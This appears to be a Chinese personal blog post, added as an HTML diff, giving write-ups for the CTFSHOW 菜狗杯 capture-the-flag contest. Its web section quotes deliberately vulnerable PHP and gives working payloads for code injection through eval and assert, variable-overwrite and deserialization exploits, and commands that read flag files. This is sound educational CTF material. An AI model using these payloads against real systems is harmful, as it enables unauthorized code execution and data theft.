@@ -1,0 +1,473 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hoylindo || CTFSHOW_菜狗杯_wp</title>
+    <meta name="author" content="hoylindo">
+    <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/1.jpg">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/maiden-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#fba3cf; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>dadada~</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hoylindo</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Hoylindo</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>CTFSHOW_菜狗杯_wp </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2022/11/12
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/CTF">
+                <span class="icon">
+                    <a-icon type="book" theme="filled" />
+                </span>
+                CTF
+            </a>
+        </span>
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/CTF-WP" style=color:#879cff>
+                    CTF-WP
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <br>
+
+<span id="more"></span>
+
+<h2 id="CTFSHOW-菜狗杯"><a href="#CTFSHOW-菜狗杯" class="headerlink" title="CTFSHOW-菜狗杯"></a>CTFSHOW-菜狗杯</h2><h3 id="web-web签到"><a href="#web-web签到" class="headerlink" title="web-web签到"></a>web-web签到</h3><ul>
+<li><p>怎么有人不会传参啊（</p>
+</li>
+<li><p>抄一份源码，是个挺有意思的题</p>
+<pre><code class="php">&lt;?php
+    error_reporting(0);
+    highlight_file(__FILE__);
+
+    eval($_REQUEST[$_GET[$_POST[$_COOKIE[&#39;CTFshow-QQ群:&#39;]]]][6][0][7][5][8][0][9][4][4]);
+</code></pre>
+</li>
+<li><p>这里需要注意的是，用hackbar传的cookie参数有时候传不进去，bp抓包手动传</p>
+</li>
+<li><p>然后，中文一直变乱码，转成url编码传：<code>Cookie: CTFshow-QQ%E7%BE%A4:=a</code></p>
+</li>
+<li><p>post传：<code>a=b</code>，get传：<code>?b=c&amp;c[6][0][7][5][8][0][9][4][4]=system(&#39;cat%20/f1agaaa&#39;);</code></p>
+</li>
+<li><p>得到flag：<code>ctfshow&#123;a594c2b9-820e-43ca-8691-ab82e56421cd&#125;</code></p>
+</li>
+</ul>
+<h3 id="web-c0me-t0-s1gn"><a href="#web-c0me-t0-s1gn" class="headerlink" title="web-c0me_t0_s1gn"></a>web-c0me_t0_s1gn</h3><ul>
+<li>看到页面提示直接看源码，找到一堆js和半个flag：<code>ctfshow&#123;We1c0me_</code></li>
+<li>源码里提示控制台，打开控制台提示调用<code>g1ve_flag()</code>函数，直接输入得到另一半flag：<code>t0_jo1n_u3_!&#125;</code></li>
+</ul>
+<h3 id="web-我的眼里只有"><a href="#web-我的眼里只有" class="headerlink" title="web-我的眼里只有$"></a>web-我的眼里只有$</h3><ul>
+<li><p>猜到是变量覆盖但是</p>
+<pre><code class="php">&lt;?php
+    error_reporting(0);
+    extract($_POST);
+    eval($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_);
+    highlight_file(__FILE__);
+</code></pre>
+</li>
+<li><p>或许写个脚本生成payload会比手敲快（?），可能我唯一聪明的一点就是<code>strlen</code>输出了一下<code>$</code>的个数，36个（?）</p>
+<pre><code class="payload">_=a&amp;a=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=n&amp;n=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=A&amp;A=B&amp;B=C&amp;C=D&amp;D=F&amp;F=G&amp;G=H&amp;H=I&amp;I=J&amp;J=system(&#39;cat /f1agaaa&#39;);
+</code></pre>
+</li>
+<li><p>得到flag：<code>ctfshow&#123;8ca2165a-f062-4831-b9f5-ca4fd3c0b446&#125;</code></p>
+</li>
+</ul>
+<h3 id="web-抽老婆？"><a href="#web-抽老婆？" class="headerlink" title="web-抽老婆？"></a>web-抽老婆？</h3><ul>
+<li>抽到一个那么好看的粉毛呜呜呜，但是这题也不会，先占个位置，过后补</li>
+<li>找到了一个目录：<code>/download?file=</code> ，传进去<code>?file=flag</code>，Unicode解码出来是：你想干什么？也不知道这个思路是不是对的</li>
+<li>werkzeug， 好像是python的什么框架还是什么</li>
+</ul>
+<h3 id="web-一言既出"><a href="#web-一言既出" class="headerlink" title="web-一言既出"></a>web-一言既出</h3><ul>
+<li><p>又是一个php特性，抄一手源码：</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__); 
+include &quot;flag.php&quot;;  
+if (isset($_GET[&#39;num&#39;]))&#123;
+    if ($_GET[&#39;num&#39;] == 114514)&#123;
+        assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;一言既出，驷马难追!&quot;);
+        echo $flag;
+    &#125; 
+&#125; 
+</code></pre>
+</li>
+<li><p>一开始还妄图找到114514和1919810之前存在某种进制关系….</p>
+</li>
+<li><p>然后想到，assert是可以执行代码的，就打算传注释符和换行进去执行一个<code>phpinfo();</code>看看能不能成功，但是也失败了</p>
+</li>
+<li><p>试着闭合一下括号，竟然，成功了😳，payload：<code>?num=114514);//</code></p>
+</li>
+<li><p>得到flag：<code>ctfshow&#123;f13534cd-4c33-4738-956e-d48bba54989d&#125;</code></p>
+</li>
+</ul>
+<h3 id="web-驷马难追"><a href="#web-驷马难追" class="headerlink" title="web-驷马难追"></a>web-驷马难追</h3><ul>
+<li><p>完蛋，括号被ban了</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__); 
+include &quot;flag.php&quot;;  
+if (isset($_GET[&#39;num&#39;]))&#123;
+     if ($_GET[&#39;num&#39;] == 114514 &amp;&amp; check($_GET[&#39;num&#39;]))&#123;
+              assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;一言既出，驷马难追!&quot;);
+              echo $flag;
+     &#125; 
+&#125; 
+
+function check($str)&#123;
+  return !preg_match(&quot;/[a-z]|\;|\(|\)/&quot;,$str);
+&#125;
+</code></pre>
+</li>
+<li><p>直接加法绕过，顺便发现上一题失败的原因是忘记给加号去url编码了，payload：<code>?num=114514%2b1805296</code></p>
+</li>
+<li><p>得到flag：<code>ctfshow&#123;5d9720de-3a7b-4edf-93b6-cfb738dee7b5&#125;</code></p>
+</li>
+</ul>
+<h3 id="web-TapTapTap"><a href="#web-TapTapTap" class="headerlink" title="web-TapTapTap"></a>web-TapTapTap</h3><ul>
+<li>怎么又是游戏啊，bp抓包啥也没有，应该是纯前端题，翻js</li>
+<li>在<code>/js/habibiScript.js</code>里看到一堆判断是否通关之类的函数</li>
+<li>找到宝啦：<code>alert(atob(&#39;WW91ciBmbGFnIGlzIGluIC9zZWNyZXRfcGF0aF95b3VfZG9fbm90X2tub3cvc2VjcmV0ZmlsZS50eHQ=&#39;));</code></li>
+<li>解码得到：<code>Your flag is in /secret_path_you_do_not_know/secretfile.txt</code></li>
+<li>直接访问，得到flag：<code>ctfshow&#123;59d118fb-057a-4466-bfda-0aaa336db3b6&#125;</code></li>
+</ul>
+<h3 id="web-Webshell"><a href="#web-Webshell" class="headerlink" title="web-Webshell"></a>web-Webshell</h3><ul>
+<li><p>反序列化+正则，执行命令中不允许包含<code>flag</code>，构造exp：</p>
+<pre><code class="php">&lt;?php
+    error_reporting(0);
+    class Webshell &#123;
+        public $cmd = &#39;cat f*&#39;; //命令
+        public function __construct() &#123;
+            $this-&gt;init();
+        &#125;
+        public function init() &#123;
+            /*if (!preg_match(&#39;/flag/i&#39;, $this-&gt;cmd)) &#123;
+                $this-&gt;exec($this-&gt;cmd);
+            &#125;*/
+        &#125;
+        public function exec($cmd) &#123;
+            $result = shell_exec($cmd);
+            echo $result;
+        &#125;
+    &#125;
+    $a = new Webshell();
+    echo urlencode(serialize($a));
+</code></pre>
+</li>
+<li><p>payload：<code>?cmd=O%3A8%3A&quot;Webshell&quot;%3A1%3A%7Bs%3A3%3A&quot;cmd&quot;%3Bs%3A2%3A&quot;ls&quot;%3B%7D</code>，找到<code>flag.php</code></p>
+</li>
+<li><p><code>?cmd=O%3A8%3A&quot;Webshell&quot;%3A1%3A%7Bs%3A3%3A&quot;cmd&quot;%3Bs%3A6%3A&quot;cat%20f%2A&quot;%3B%7D</code>，查看源码</p>
+</li>
+<li><p>得到flag：<code>ctfshow&#123;c1da0873-9514-4be6-a08a-d1a8952036c1&#125;</code></p>
+</li>
+</ul>
+<h3 id="web-化零为整"><a href="#web-化零为整" class="headerlink" title="web-化零为整"></a>web-化零为整</h3><ul>
+<li><p>源码：</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+include &quot;flag.php&quot;;
+$result=&#39;&#39;;
+for ($i=1;$i&lt;=count($_GET);$i++)&#123;
+    if (strlen($_GET[$i])&gt;1)&#123;
+        die(&quot;你太长了！！&quot;);
+        &#125;
+    else&#123;
+    $result=$result.$_GET[$i];
+    &#125;
+&#125;
+if ($result ===&quot;大牛&quot;)&#123;
+    echo $flag;
+&#125;
+</code></pre>
+</li>
+<li><p>其实就是只能按顺序传入数字命名的参数然后长度限制了不能大于1</p>
+</li>
+<li><p><code>strlen</code>汉字的长度是2，转化为url编码一个一个传就好了：<code>%E5%A4%A7%E7%89%9B</code></p>
+</li>
+<li><p>payload：<code>?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</code></p>
+</li>
+<li><p>得到flag：<code>ctfshow&#123;f72f1179-1355-46d6-8b03-ba1663d07a71&#125;</code></p>
+</li>
+</ul>
+<h3 id="web-无一幸免"><a href="#web-无一幸免" class="headerlink" title="web-无一幸免"></a>web-无一幸免</h3><ul>
+<li><p>白送题：</p>
+<pre><code class="php">&lt;?php
+include &quot;flag.php&quot;;
+highlight_file(__FILE__);
+if (isset($_GET[&#39;0&#39;]))&#123;
+    $arr[$_GET[&#39;0&#39;]]=1;
+    if ($arr[]=1)&#123;
+        die($flag);
+    &#125;
+    else&#123;
+        die(&quot;nonono!&quot;);
+    &#125;
+&#125;
+</code></pre>
+</li>
+<li><p>payload：<code>?0=0</code>，得到flag：<code>ctfshow&#123;547f9423-cc51-48b4-b045-f547d40bb479&#125;</code></p>
+</li>
+</ul>
+<h3 id="web-传说之下（雾）？"><a href="#web-传说之下（雾）？" class="headerlink" title="web-传说之下（雾）？"></a>web-传说之下（雾）？</h3><ul>
+<li>不会，找到了一堆可以函数，但是js看得人头疼，不想看了拜拜</li>
+</ul>
+<h3 id="web-超级算力？"><a href="#web-超级算力？" class="headerlink" title="web-超级算力？"></a>web-超级算力？</h3><ul>
+<li>没思路，占个位置复现补wp</li>
+</ul>
+<hr>
+<p>本人，misc废物，只会最简单的三道</p>
+<h3 id="misc-杂项签到"><a href="#misc-杂项签到" class="headerlink" title="misc-杂项签到"></a>misc-杂项签到</h3><ul>
+<li>winhex打开，一开始的思路是，改宽高但是木有效果，搜flag没有找到，分离图片也没分出来啥东西</li>
+<li>结果竟然是直接搜ctfshow就能找到flag，呜呜呜我就说签到题怎么能这么难嘛</li>
+<li><code>ctfshow&#123;a62b0b55682d81f7f652b26147c49040&#125;</code></li>
+</ul>
+<h3 id="misc-损坏的压缩包"><a href="#misc-损坏的压缩包" class="headerlink" title="misc-损坏的压缩包"></a>misc-损坏的压缩包</h3><ul>
+<li>根据提示直接winhex打开，发现是png图，直接改后缀打开，看到flag</li>
+<li><code>ctfshow&#123;e19efe2eb86f10ccd7ca362110903c05&#125;</code></li>
+</ul>
+<h3 id="misc-我吐了你随意"><a href="#misc-我吐了你随意" class="headerlink" title="misc-我吐了你随意"></a>misc-我吐了你随意</h3><ul>
+<li>3Q，我也吐了</li>
+<li>直接告诉了是0宽，<a target="_blank" rel="noopener" href="http://330k.github.io/misc_tools/unicode_steganography.html">直接解密</a> ，拿到flag：<code>ctfshow&#123;OP_is_for_Over_Power&#125;</code></li>
+</ul>
+
+    </div>
+
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2022 Hoylindo
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @hoylindo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1" ></canvas> 
+    <script src="/js/1.js"></script>
+    
+    <canvas class="fireworks" style="position: fixed; left: 0; top: 0; z-index: 99999999; pointer-events: none;"></canvas>
+    <script type="text/javascript" src="/js/aixin.js"></script>
+    <script type="text/javascript" src="/js/anime.min.js"></script>
+    <script type="text/javascript" src="/js/fireworks.js"></script>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+</body>
+
+</html>
